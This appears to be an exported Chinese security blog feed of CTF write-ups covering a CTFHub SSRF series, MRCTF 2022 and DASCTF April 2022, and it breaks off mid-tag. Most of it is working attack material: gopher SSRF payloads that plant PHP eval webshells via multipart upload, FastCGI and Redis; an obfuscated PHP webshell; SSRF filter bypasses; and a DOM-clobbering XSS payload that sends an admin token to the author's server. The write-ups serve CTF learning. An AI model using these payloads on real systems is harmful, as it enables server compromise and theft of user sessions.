class="language-none"><code class="language-none">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%2520%252Fflag.php%2520HTTP%252F1.1%250D%250AHost%253A%2520127.0.0.1%253A80%250D%250AContent-Length%253A%2520308%250D%250APragma%253A%2520no-cache%250D%250ACache-Control%253A%2520no-cache%250D%250AUpgrade-Insecure-Requests%253A%25201%250D%250AOrigin%253A%2520http%253A%252F%252Fchallenge-abdf75c2760a97e9.sandbox.ctfhub.com%253A10800%250D%250AContent-Type%253A%2520multipart%252Fform-data%253B%2520boundary%253D----WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AUser-Agent%253A%2520Mozilla%252F5.0%2520(Windows%2520NT%252010.0%253B%2520Win64%253B%2520x64)%2520AppleWebKit%252F537.36%2520(KHTML%252C%2520like%2520Gecko)%2520Chrome%252F100.0.4896.127%2520Safari%252F537.36%2520Edg%252F100.0.1185.50%250D%250AAccept%253A%2520text%252Fhtml%252Capplication%252Fxhtml%252Bxml%252Capplication%252Fxml%253Bq%253D0.9%252Cimage%252Fwebp%252Cimage%252Fapng%252C*%252F*%253Bq%253D0.8%252Capplication%252Fsigned-exchange%253Bv%253Db3%253Bq%253D0.9%250D%250AReferer%253A%2520http%253A%252F%252Fchallenge-abdf75c2760a97e9.sandbox.ctfhub.com%253A10800%252F%253Furl%253D127.0.0.1%252Fflag.php%250D%250AAccept-Encoding%253A%2520gzip%252C%2520deflate%250D%250AAccept-Language%253A%2520zh-CN%252Czh%253Bq%253D0.9%252Cen%253Bq%253D0.8%252Cen-GB%253Bq%253D0.7%252Cen-US%253Bq%253D0.6%250D%250AConnection%253A%2520close%250D%250A%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%253B%2520filename%253D%25221.pdf%2522%250D%250AContent-Type%253A%2520application%252Fpdf%250D%250A%250D%250A%253C%253Fphp%2520%2540eval(%2524_POST%255B%2522a%2522%255D)%253B%253F%253E%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw%250D%250AContent-Disposition%253A%2520form-data%253B%2520name%253D%2522file%2522%250D%250A%250D%250A%25C3%25A6%25C2%258F%25C2%2590%25C3%25A4%25C2%25BA%25C2%25A4%250D%250A------WebKitFormBoundaryXT85fz2P3lDnY3Aw--</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429162248432.png" alt="image-20220429162248432"></p><h3 id="FastCGI协议-1"><a href="#FastCGI协议-1" class="headerlink" title="FastCGI协议"></a>FastCGI协议</h3><p><strong>方法一</strong>：</p><p>直接上gopherus</p><p>其中/usr/local/lib/php/PEAR.php 为安装php时默认自带的php文件</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429170013890.png" alt="image-20220429170013890"></p><p>先ls /，再cat，在url中要先把这个payload的值再url编码一次，才能拿到flag</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-5da7279b1e83a566.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%2501%2501%2500%2501%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%2500%2501%2501%2508%2500%2500%250F%2510SERVER_SOFTWAREgo%2520%2F%2520fcgiclient%2520%250B%2509REMOTE_ADDR127.0.0.1%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250E%2502CONTENT_LENGTH94%250E%2504REQUEST_METHODPOST%2509KPHP_VALUEallow_url_include%2520%253D%2520On%250Adisable_functions%2520%253D%2520%250Aauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%251BSCRIPT_FILENAME%2Fusr%2Flocal%2Flib%2Fphp%2FPEAR.php%250D%2501DOCUMENT_ROOT%2F%2501%2504%2500%2501%2500%2500%2500%2500%2501%2505%2500%2501%2500%255E%2504%2500%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_52cc1357979c158b0cb02c8ff00b83b1%2527%2529%253Bdie%2528%2527-----Made-by-SpyD3r-----%250A%2527%2529%253B%253F%253E%2500%2500%2500%2500</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429170110205.png" alt="image-20220429170110205"></p><p><strong>方法二：</strong></p><p><a href="https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75">https://gist.github.com/phith0n/9615e2420f31048f7e30f3937356cf75</a></p><p>p牛的脚本fpm.py </p><p>开两个终端，一个监听自己的9000端口</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220035078.png" alt="image-20220429220035078"></p><p>另一个执行脚本</p><pre class="language-none"><code class="language-none">命令：python [脚本名] -c [要执行的代码] -p [端口号] [ip] [要执行的php文件]</code></pre><pre class="language-none"><code class="language-none">python3 fpm.py 127.0.0.1 &#x2F;var&#x2F;www&#x2F;html&#x2F;index.php -c &quot;&lt;?php system(&#39;ls&#39;);?&gt;&quot;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220107107.png" alt="image-20220429220107107"></p><p>得到exp.txt</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220158472.png" alt="image-20220429220158472"></p><p>进行url编码</p><pre class="language-none"><code class="language-none">#python2from urllib import quotef &#x3D; open(&#39;D:\Desktop\exp.txt&#39;)ff &#x3D; f.read()print(&#39;gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_&#39;+quote(ff))#gopher:&#x2F;&#x2F;127.0.0.1:9000&#x2F;_%01%01%E8u%00%08%00%00%00%01%00%00%00%00%00%00%01%04%E8u%01%DB%00%00%11%0BGATEWAY_INTERFACEFastCGI&#x2F;1.0%0E%04REQUEST_METHODPOST%0F%17SCRIPT_FILENAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0B%17SCRIPT_NAME&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0C%00QUERY_STRING%0B%17REQUEST_URI&#x2F;var&#x2F;www&#x2F;html&#x2F;index.php%0D%01DOCUMENT_ROOT&#x2F;%0F%0ESERVER_SOFTWAREphp&#x2F;fcgiclient%0B%09REMOTE_ADDR127.0.0.1%0B%04REMOTE_PORT9985%0B%09SERVER_ADDR127.0.0.1%0B%02SERVER_PORT80%0B%09SERVER_NAMElocalhost%0F%08SERVER_PROTOCOLHTTP&#x2F;1.1%0C%10CONTENT_TYPEapplication&#x2F;text%0E%02CONTENT_LENGTH21%09%1FPHP_VALUEauto_prepend_file%20%3D%20php%3A&#x2F;&#x2F;input%0F%16PHP_ADMIN_VALUEallow_url_include%20%3D%20On%01%04%E8u%00%00%00%00%01%05%E8u%00%15%00%00%3C%3Fphp%20system%28%27ls%27%29%3B%3F%3E%01%05%E8u%00%00%00%00</code></pre><p>再对得到的结果进行再次编码</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-1c4d6ae123d715b8.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;gopher%3A%2F%2F127.0.0.1%3A9000%2F_%2501%2501%25E8u%2500%2508%2500%2500%2500%2501%2500%2500%2500%2500%2500%2500%2501%2504%25E8u%2501%25DB%2500%2500%2511%250BGATEWAY_INTERFACEFastCGI%2F1.0%250E%2504REQUEST_METHODPOST%250F%2517SCRIPT_FILENAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250B%2517SCRIPT_NAME%2Fvar%2Fwww%2Fhtml%2Findex.php%250C%2500QUERY_STRING%250B%2517REQUEST_URI%2Fvar%2Fwww%2Fhtml%2Findex.php%250D%2501DOCUMENT_ROOT%2F%250F%250ESERVER_SOFTWAREphp%2Ffcgiclient%250B%2509REMOTE_ADDR127.0.0.1%250B%2504REMOTE_PORT9985%250B%2509SERVER_ADDR127.0.0.1%250B%2502SERVER_PORT80%250B%2509SERVER_NAMElocalhost%250F%2508SERVER_PROTOCOLHTTP%2F1.1%250C%2510CONTENT_TYPEapplication%2Ftext%250E%2502CONTENT_LENGTH21%2509%251FPHP_VALUEauto_prepend_file%2520%253D%2520php%253A%2F%2Finput%250F%2516PHP_ADMIN_VALUEallow_url_include%2520%253D%2520On%2501%2504%25E8u%2500%2500%2500%2500%2501%2505%25E8u%2500%2515%2500%2500%253C%253Fphp%2520system%2528%2527ls%2527%2529%253B%253F%253E%2501%2505%25E8u%2500%2500%2500%2500</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429220326896.png" alt="image-20220429220326896"></p><p>成功读到了文件，后边就是ls /然后cat /flag的操作了</p><p>看到有wp用的写一句话木马的方式，然后蚁剑连接，但是我没复现成功</p><p><a href="https://blog.csdn.net/unexpectedthing/article/details/121643002?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2~default~CTRLIST~Rate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1">https://blog.csdn.net/unexpectedthing/article/details/121643002?spm=1001.2101.3001.6661.1&amp;utm_medium=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;depth_1-utm_source=distribute.pc_relevant_t0.none-task-blog-2%7Edefault%7ECTRLIST%7ERate-1.pc_relevant_antiscanv2&amp;utm_relevant_index=1</a></p><h3 id="redis协议"><a href="#redis协议" class="headerlink" title="redis协议"></a>redis协议</h3><p>直接上gopherus</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222019370.png" alt="image-20220429222019370"></p><p>这里如果php payload按默认的来的话应该是一个以cmd为密码的一句话木马</p><pre class="language-none"><code class="language-none">url&#x3D;gopher%3A%2F%2F127.0.0.1%3A6379%2F_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252434%250D%250A%250A%250A%253C%253Fphp%2520system%2528%2527cat%2520%2Fflag_%252A%2527%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2Fvar%2Fwww%2Fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</code></pre><p>同样是再编码一次然后上传，之后访问shell.php就能看见结果了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222057019.png" alt="image-20220429222057019"></p><h3 id="URL-Bypass"><a href="#URL-Bypass" class="headerlink" title="URL Bypass"></a>URL Bypass</h3><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222350965.png" alt="image-20220429222350965"></p><p>要求必须有<a href="http://notfound.ctfhub.com/">http://notfound.ctfhub.com</a></p><p>可以利用@来绕过</p><pre class="language-none"><code class="language-none">http:&#x2F;&#x2F;challenge-eb34acd716115c01.sandbox.ctfhub.com:10800&#x2F;?url&#x3D;http:&#x2F;&#x2F;notfound.ctfhub.com@127.0.0.1&#x2F;flag.php</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222336425.png" alt="image-20220429222336425"></p><h3 id="数字IP-Bypass"><a href="#数字IP-Bypass" class="headerlink" title="数字IP Bypass"></a>数字IP Bypass</h3><p>ban掉了127以及172.不能使用点分十进制的IP了。但是又要访问127.0.0.1</p><p>0.0.0.0</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222507844.png" alt="image-20220429222507844"></p><p>localhost</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222628519.png" alt="image-20220429222628519"></p><p>还有本地回环的其他表示方法</p><p>http://[::ffff:7f00:1]</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222734210.png" alt="image-20220429222734210"></p><p><a href="http://0.0.0.0/">http://0:80</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429222833867.png" alt="image-20220429222833867"></p><p>ip十六进制</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224122368.png" alt="image-20220429224122368"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224716467.png" alt="image-20220429224716467"></p><p>ip八进制</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224213146.png" alt="image-20220429224213146"></p><p>顺带一提这个正则匹配的过滤，好像还过滤了http://和/flag.php之间的点，但是你只要去了前边的http://就能绕过了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224407850.png" alt="image-20220429224407850"></p><p>ip十进制</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429224636453.png" alt="image-20220429224636453"></p><h3 id="302跳转-Bypass"><a href="#302跳转-Bypass" class="headerlink" title="302跳转 Bypass"></a>302跳转 Bypass</h3><p>感觉题目环境有点问题，利用短链接并不能实现跳转，只能file协议读一下源码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429230757875.png" alt="image-20220429230757875"></p><p>然后localhost或者0.0.0.0就过了</p><hr><p>对不起，我道歉，不是环境的问题，是国内的那些短链接生成网站的问题。。。</p><p>用这个<a href="https://tinyurl.com/app/">https://tinyurl.com/app/</a></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429232119669.png" alt="image-20220429232119669"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429232131305.png" alt="image-20220429232131305"></p><h3 id="DNS重绑定-Bypass"><a href="#DNS重绑定-Bypass" class="headerlink" title="DNS重绑定 Bypass"></a>DNS重绑定 Bypass</h3><p><a href="https://zhuanlan.zhihu.com/p/89426041">浅谈DNS重绑定漏洞 - 知乎 (zhihu.com)</a></p><p><strong>DNS Rebinding</strong></p><p>在网页浏览过程中，用户在地址栏中输入包含域名的网址。浏览器通过DNS服务器将域名解析为IP地址，然后向对应的IP地址请求资源，最后展现给用户。而对于域名所有者，他可以设置域名所对应的IP地址。当用户第一次访问，解析域名获取一个IP地址；然后，域名持有者修改对应的IP地址；用户再次请求该域名，就会获取一个新的IP地址。对于浏览器来说，整个过程访问的都是同一域名，所以认为是安全的。这就造成了DNS Rebinding攻击。</p><p><strong>具体步骤</strong></p><ol><li>攻击者控制恶意的DNS服务器来回复域的查询,如rebind.network</li><li>攻击者通过一些方式诱导受害者加载<a href="https://link.zhihu.com/?target=http://rebind.network">http://rebind.network</a></li><li>用户打开链接,浏览器就会发出DNS请求查找rebind.network的IP地址</li><li>恶意DNS服务器收到受害者的请求,并使用真实IP地址进行响应,并将TTL值设置为1秒,让受害者的机器缓存很快失效</li><li>从<a href="https://link.zhihu.com/?target=http://rebind.network">http://rebind.network</a>加载的网页包含恶意的js代码,构造恶意的请求到<a href="https://link.zhihu.com/?target=http://rebind.network/index">http://rebind.network/index</a>,而受害者的浏览器便在执行恶意请求</li><li>一开始的恶意请求当然是发到了攻击者的服务器上,但是随着TTL时间结束,攻击者就可以让<a href="https://link.zhihu.com/?target=http://rebind.network">http://rebind.network</a>绑定到别的IP,如果能捕获受害者的一些放在内网的应用IP地址,就可以针对这个内网应用构造出对应的恶意请求,然后浏览器执行的恶意请求就发送到了内网应用,达到了攻击的效果</li></ol><p><strong>同源策略的失效</strong></p><p>对于WEB的同源策略相信大家都很熟悉,<strong>如果两个页面的协议，端口（如果有指定）和域名都相同，则两个页面具有相同的源</strong>,而不同源的客户端脚本在没有明确授权的情况下，不能读写对方资源。</p><p>当然,页面中的链接，重定向以及表单提交是不会受到同源策略限制的,并且,跨域资源的引入是可以的。但是js不能读写加载的内容。</p><p>同源策略确实提高了web的安全性,但是对于DNS Rebinding来说是没有作用的,因为同源策略看的是域名,并不是背后的IP地址,虽然两次的请求IP地址不同,但是由于DNS服务器的绑定,域名都是一样的,那么自然不违反同源策略.</p><p><a href="https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg">https://lock.cmpxchg8b.com/rebinder.html?tdsourcetag=s_pctim_aiomsg</a></p><p>在这个网站设置</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429231547758.png" alt="image-20220429231547758"></p><p>然后访问就行了，如果没有的话多刷新几次，因为生成的主机名将随机解析为使用非常低的 ttl 指定的地址之一。</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/ssrf/image-20220429231604839.png" alt="image-20220429231604839"></p>]]></content>
      
      
      
        <tags>
            
            <tag> web学习 </tag>
            
            <tag> ssrf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022MRCTF复现</title>
      <link href="/2022/04/25/2022MRCTF%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/25/2022MRCTF%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>我太菜了，只能靠看别人的wp来复现过日子了</p><h3 id="WebCheckIn"><a href="#WebCheckIn" class="headerlink" title="WebCheckIn"></a>WebCheckIn</h3><p>好骚的思路，从来没有想过能这样</p><p>一个只能传php文件的文件上传，但是检测到一些命令执行或者其他的内容就会报错。</p><p><strong>方法一</strong></p><p> r4kapig的wp里的方式，利用new ERROR(1);来抛出错误</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215113191.png" alt="image-20220425215113191"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215120212.png" alt="image-20220425215120212"></p><p>但是事实上这应该是这道题的后端用来过滤上传的php文件里的内容的代码导致的，这个检测感觉有点神奇。利用new一个类之后后边不管是什么都能传上去，只不过只有new一个php的基类时上传的php文件才不会因为报错而导致停止执行。也就是说，这里随便new一个基类就行</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215459825.png" alt="image-20220425215459825"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425215526239.png" alt="image-20220425215526239"></p><p>然后执行grep命令找flag就行</p><p><strong>方法二</strong></p><p>这是wm的wp里的方法</p><p>一个靠构造CHR以及动态拼接特性构造出的一个很离谱的webshell</p><pre class="language-none"><code class="language-none">&lt;?php(((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((9.9999999999999999^9)^((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99)))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^((.999999999999999).(.999999999999999))).(.999999999999999)))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((9.9999999999999999^9)^((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99)))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(.999999999999999).((.999999999999999)^(9^((.999999999999999).(.999999999999999)))^(9.9999999999999999^9^99.999999999999999^99))))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^9).(.999999999999999)))).((((999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999999).(9))^((9.9999999999999999^9).(9.9999999999999999^9).(9.9999999999999999^9))^((99).(9))^((9).(9.9999999999999999))^((9^9).(9.9999999999999999^9^99.999999999999999^99).(9^9))^((9^9).(9^9).(9^9))^((99.9).(9)))(((.999999999999999).(9^9).(9)))))($_POST[1])?&gt;</code></pre><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425220952133.png" alt="image-20220425220952133"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425221006937.png" alt="image-20220425221006937"></p><h3 id="God-of-GPA"><a href="#God-of-GPA" class="headerlink" title="God_of_GPA"></a>God_of_GPA</h3><p>先注册个账号，然后登录</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230157304.png" alt="image-20220425230157304"></p><p>我们可以看到这里有token，这应该是负责认证用户身份的。</p><p>登录之后在查看成绩里有个只有管理员才能看的按钮，而且我们还可以发垃圾话，然后将id提交给管理员让他看。这道题就是让我们利用xss来获取管理员的token来得到flag</p><pre class="language-html" data-language="html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>scrip<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>console.log("injected");let uri = window.location.href + "";if (uri.indexOf('token') > -1)&#123;    location.href="//服务器ip/flag?f="+encodeURIComponent(uri)&#125;else&#123; location.href="http://brtserver.node3.mrctf.fun/oauth/authorize?redirect_uri="+window.location.href&#125;<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">'</span>data:,<span class="token punctuation">"</span>onerror=<span class="token punctuation">"</span>eval(scrip.innerText)<span class="token punctuation">'</span></span> <span class="token attr-name">id</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>MyImg<span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span></code></pre><p>然后我们将uuid提交给管理员</p><p>就可以在服务器的日志里找到管理员的token</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230709447.png" alt="image-20220425230709447"></p><p>回到login路径下把token换掉就行了</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230756857.png" alt="image-20220425230756857"></p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022mrctf/image-20220425230836819.png" alt="image-20220425230836819"></p><p>这里xss的利用好像主要是Dom Clobbering技术来触发的dom型xss</p><p>（说起来因为dom型xss利用的少，我还是第一次见</p><p><a href="https://xz.aliyun.com/t/7329">使用 Dom Clobbering 扩展 XSS - 先知社区 (aliyun.com)</a></p><p>附一个出题人写的</p><p><a href="https://ibukifalling.github.io/2022/04/25/God-of-GPA-WP/">MRCTF2022_God_of_GPA_WP - Welcome to fallingblog (ibukifalling.github.io)</a></p><p>发现好像只有这两个能复现。。。其他的都是Java安全了，放一下y4师傅的java题的wp，以后学会Java之后再看</p><p><a href="https://y4tacker.github.io/2022/04/24/year/2022/4/2022MRCTF-Java%E9%83%A8%E5%88%86/">2022MRCTF-Java部分 | Y4tacker&#39;s Blog</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2022DASCTF Apr复现</title>
      <link href="/2022/04/24/2022DASCTF-Apr%E5%A4%8D%E7%8E%B0/"/>
      <url>/2022/04/24/2022DASCTF-Apr%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<p>纯复现了，没打</p><h1 id="Misc"><a href="#Misc" class="headerlink" title="Misc"></a>Misc</h1><p>当时就看了看这一个misc，觉得应该是有文件，但是没提出来</p><h2 id="SimpleFlow"><a href="#SimpleFlow" class="headerlink" title="SimpleFlow"></a>SimpleFlow</h2><p>一道流量分析题，用wireshark打开，然后追踪一下tcp流，看起来想是蚁剑的流量特征，在第52流看到了flag的zip</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424214710424.png" alt="image-20220424214710424"></p><p>变成原始数据</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424214922714.png" alt="image-20220424214922714"></p><p>很明显的504b的zip文件头，复制出来放010里另存为拿到zip文件，但是需要密码，再看看第50流</p><p>url解码后</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424215052128.png" alt="image-20220424215052128"></p><p>我们直接找m8f8d9db647ecd对应的值，然后把它base64解码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424215126797.png" alt="image-20220424215126797"></p><p>但是还是没有找到密码，而我们发现url解码后的数据还有其他的参数，但是并不能直接base64解码，这是因为传参之后被substr去掉了前面两位</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424215250325.png" alt="image-20220424215250325"></p><p>所以我们可以去掉前两位之后再解码，在g479cf6f058cf8对应的Y2QgIi9Vc2Vycy9jaGFuZy9TaXRlcy90ZXN0Ijt6aXAgLVAgUGFTc1ppUFdvckQgZmxhZy56aXAgLi4vZmxhZy50eHQ7ZWNobyBbU107cHdkO2VjaG8gW0Vd中得到我们的密码</p><p><img src="https://epicture.oss-cn-beijing.aliyuncs.com/img/2022DASCTF-Apr/image-20220424215358355.png" alt="image-20220424215358355"></p><pre class="language-none"><code class="language-none">PaSsZiPWorD</code></pre><p>解压缩，拿到flag</p><h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="warmup-php"><a href="#warmup-php" class="headerlink" title="warmup-php"></a>warmup-php</h2><p>这题看起来很麻烦，但是如果自己一步一步调试，还是很好出的</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpspl_autoload_register(function($class)&#123;    require(&quot;.&#x2F;class&#x2F;&quot;.$class.&quot;.php&quot;);&#125;);highlight_file(__FILE__);error_reporting(0);$action &#x3D; $_GET[&#39;action&#39;];$properties &#x3D; $_POST[&#39;properties&#39;];class Action&#123;    public function __construct($action,$properties)&#123;        $object&#x3D;new $action();        foreach($properties as $name&#x3D;&gt;$value)            $object-&gt;$name&#x3D;$value;        $object-&gt;run();    &#125;&#125;new Action($action,$properties);?&gt;</code></pre><p>先看第一段，action是类名，properties的key是属性，value是值</p><p>所以我们的赋值就要依靠properties</p><p>然后调用action定义的类里的run方法</p><p>run方法在ListView.php里</p><pre class="language-php" data-language="php"><code class="language-php">&lt;?phpclass ListView&#123;    public $tagName&#x3D;&#39;div&#39;;    public $template &#x3D; &#39;flag&#39;;    public function run()    &#123;        echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\n&quot;;        $this-&gt;renderContent();        echo &quot;&lt;&quot;.$this-&gt;tagName.&quot;&gt;\n&quot;;    &#125;    public function renderContent()    &#123;        ob_start();        echo preg_replace_callback(&quot;&#x2F;&#123;(\w+)&#125;&#x2F;&quot;,array($this,&#39;renderSection&#39;),$this-&gt;template);        ob_end_flush();    &#125;    protected function renderSection($matches)    &#123;        $method&#x3D;&#39;render&#39;.$matches[1];        if(method_exists($this,$method))        &#123;            $this-&gt;$method();            $html&#x3D;ob_get_contents();            ob_clean();            return $html;        &#125;        else            return $matches[0];    &#125;&#125;</code></pre><p>run-&gt;renderContent-&gt;renderSection</p><p>在renderContent中利用preg_replace_callback对template中的值进行了正则匹配，如果匹配到{\w+}就调用renderSection，而将匹配到的结果进行参数传入renderSection，而在renderSection中将$matches[1]与render进行了一个拼接，并检测是否有这个方法，有就去执行它。</p><p>我们可以调试一下看看匹配到的参数matches是什么形式的</p><p><img 